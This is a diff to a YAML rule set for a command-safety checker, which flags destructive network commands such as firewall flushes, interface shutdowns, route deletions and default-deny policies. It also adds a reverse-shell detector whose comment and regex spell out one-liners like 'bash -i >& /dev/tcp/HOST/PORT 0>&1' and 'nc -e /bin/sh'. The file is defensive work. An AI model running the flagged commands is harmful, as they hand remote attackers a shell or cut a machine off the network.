@@ -1,60 +1,95 @@
 - from: network
-  test: ip6?tables\s+-F
-  description: "Flushing all firewall rules"
+  # Any option order: `-w -F`, `--flush`, `-t filter -F`, `iptables-legacy -F`.
+  test: (?:^|\s)ip6?tables(?:-legacy|-nft)?\s+(?:\S+\s+)*?(?:-[a-zA-Z]*F[a-zA-Z]*|--flush)(?:\s|$)
+  description: "This flushes all firewall rules."
   id: network:flush_iptables
   severity: Critical
+  filters:
+    # Other tables are covered by network:flush_nat_rules.
+    - type: NotMatches
+      value: '\s(?:-t|--table)(?:\s+|=)?(?:nat|mangle|raw|security)(?:\s|$)'
 - from: network
-  test: iptables\s+-X
-  description: "Deleting all custom chains"
+  test: (?:^|\s)ip6?tables(?:-legacy|-nft)?\s+(?:\S+\s+)*?(?:-X|--delete-chain)(?:\s|$)
+  description: "This deletes all custom firewall chains."
   id: network:delete_custom_chains
   severity: High
 - from: network
-  test: iptables\s+-t\s+nat\s+-F
-  description: "Flushing all NAT rules"
+  test: (?:^|\s)ip6?tables(?:-legacy|-nft)?\s+(?:\S+\s+)*?(?:-t|--table)(?:\s+|=)?nat\s+(?:\S+\s+)*?(?:-[a-zA-Z]*F[a-zA-Z]*|--flush)(?:\s|$)
+  description: "This flushes all NAT rules."
   id: network:flush_nat_rules
   severity: High
 - from: network
-  test: ufw\s+disable(\s|$)
-  description: "Disabling firewall"
+  test: (?:^|\s)ufw\s+disable(\s|$)
+  description: "This disables the firewall."
   id: network:disable_firewall
   severity: Critical
 - from: network
-  test: ufw\s+--force\s+reset
-  description: "Force resetting firewall rules"
+  test: (?:^|\s)ufw\s+(?:--force\s+)?reset(?:\s|$)
+  description: "This resets the firewall: every rule is removed and the firewall is disabled."
   id: network:force_reset_firewall
   severity: Critical
 - from: network
-  test: systemctl\s+stop\s+networking
-  description: "Stopping network service"
+  test: (?:^|\s)systemctl\s+stop\s+networking
+  description: "This stops the networking service."
   id: network:stop_networking
   severity: High
 - from: network
-  test: systemctl\s+stop\s+NetworkManager
-  description: "Stopping NetworkManager service"
+  test: (?:^|\s)systemctl\s+stop\s+NetworkManager
+  description: "This stops NetworkManager."
   id: network:stop_network_manager
   severity: High
 - from: network
-  test: ifconfig\s+\w+\s+down
-  description: "Bringing down network interface"
+  test: (?:^|\s)ifconfig\s+\w+\s+down
+  description: "This brings a network interface down."
   id: network:bring_down_interface
   severity: High
 - from: network
-  test: ip\s+link\s+set\s+[\w-]+\s+down
-  description: "Bringing down network interface using ip command"
+  test: (?:^|\s)ip\s+link\s+set\s+[\w-]+\s+down
+  description: "This brings a network interface down."
   id: network:bring_down_interface_ip
   severity: High
 - from: network
-  test: route\s+del\s+default
-  description: "Deleting default route"
+  test: (?:^|\s)route\s+del\s+default
+  description: "This deletes the default network route."
   id: network:delete_default_route
   severity: High
 - from: network
-  test: nft\s+flush\s+ruleset
+  test: (?:^|\s)nft\s+flush\s+ruleset
   description: "Flushing all nftables rules removes all firewall protection."
   id: network:flush_nftables
   severity: Critical
 - from: network
-  test: ip\s+route\s+flush
+  test: (?:^|\s)ip\s+route\s+flush
   description: "Flushing the routing table causes immediate loss of network connectivity."
   id: network:flush_routes
   severity: Critical
+- from: network
+  # A DROP default policy on INPUT/OUTPUT cuts the machine off (including the
+  # SSH session that typed it) unless ACCEPT rules already exist.
+  test: (?:^|\s)ip6?tables\s+(?:\S+\s+)*?(?:-P|--policy)\s+(?:INPUT|OUTPUT|FORWARD)\s+(?:DROP|REJECT)(?:\s|$)
+  description: "This sets the default firewall policy to DROP, which can cut off all traffic, including your SSH session."
+  id: network:iptables_default_drop
+  severity: High
+- from: network
+  # A reverse shell: an interactive shell wired to a TCP connection
+  # (`bash -i >& /dev/tcp/HOST/PORT 0>&1`), `nc -e /bin/sh`, `ncat -c`,
+  # `socat … exec:`, or the python pty one-liner. A plain `/dev/tcp` port
+  # probe (`</dev/tcp/host/22`) is not one.
+  test: '(?:(?:^|\s)(?:ba|z|k|da)?sh\s+(?:-\S+\s+)*-i\b.*/dev/(?:tcp|udp)/|/dev/(?:tcp|udp)/\S+.*\s0>&1|(?:^|\s)(?:nc|ncat|netcat|nc\.traditional)\s+(?:\S+\s+)*?-[a-zA-Z]*[ec]\s*\S|(?:^|\s)socat\s+.*\b(?:exec|system):|\bpty\.spawn\(|\bsocket\.socket\(.*\.connect\()'
+  description: "This opens a reverse shell: it hands an interactive shell on this machine to whoever listens at the remote address."
+  id: network:reverse_shell
+  severity: High
+- from: network
+  test: (?:^|\s)ip\s+(?:-\S+\s+)*(?:a|addr|address)\s+(?:flush|del)\s
+  description: "This removes the IP addresses of a network interface: the machine (and your SSH session) loses connectivity on it."
+  id: network:flush_addresses
+  severity: High
+- from: network
+  # With incoming denied by default and no `allow ssh` rule, enabling ufw
+  # cuts off the SSH session that typed it.
+  test: (?:^|\s)ufw\s+(?:--\S+\s+)*default\s+(?:deny|reject)(?:\s+(?:incoming|in))?(?:\s|$)
+  description: "This makes the firewall refuse all incoming connections by default, including SSH unless a rule allows it."
+  id: network:ufw_default_deny
+  severity: High
+  alternative: "ufw allow OpenSSH"
+  alternative_info: "Allow SSH first (then set the default policy), so the session that changes the firewall is not cut off."
